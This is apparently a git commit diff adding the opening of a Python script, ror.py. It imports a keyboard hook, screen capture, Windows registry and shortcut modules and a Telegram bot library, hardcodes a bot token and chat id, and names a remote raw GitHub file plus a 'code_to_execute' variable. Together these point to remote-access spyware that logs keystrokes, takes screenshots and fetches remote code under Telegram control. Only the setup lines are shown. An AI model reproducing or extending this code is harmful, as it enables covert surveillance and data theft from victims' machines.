b45db9d38668821af16f8db3873228b400050581
vovanskaie <136624664+vovanskaie@users.noreply.github.com>
2024-03-16 13:18:45 +0300

    Update ror.py

--- ror.py
+++ ror.py
@@ -1,3 +1,35 @@
+import os
+import ctypes
+import pyWinhook as pyHook
+import pythoncom
+from time import strftime, sleep
+from shutil import copyfile
+from sys import argv
+from win32com.client import Dispatch
+from PIL import ImageGrab
+import platform
+import requests
+from json import loads
+import telebot
+from telebot import types
+import zipfile
+import threading
+from io import BytesIO
+import shutil
+import asyncio
+from bs4 import BeautifulSoup
+import sys
+import winreg
+import winshell
+import pythoncom
+from bs4 import BeautifulSoup
+
+token = '7178222884:AAFr5QLUb_g6LKHzEgVG7mGlLLuBVSi3TjQ'
+bot = telebot.TeleBot(token)
+chat_id = 1882056354
+telegram_bot_token = "7178222884:AAFr5QLUb_g6LKHzEgVG7mGlLLuBVSi3TjQ"
+chat_ids = ('1882056354', '1882056354')
+url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/meak.py'
 code_to_execute = ''
 
 @bot.message_handler(func=lambda message: True)
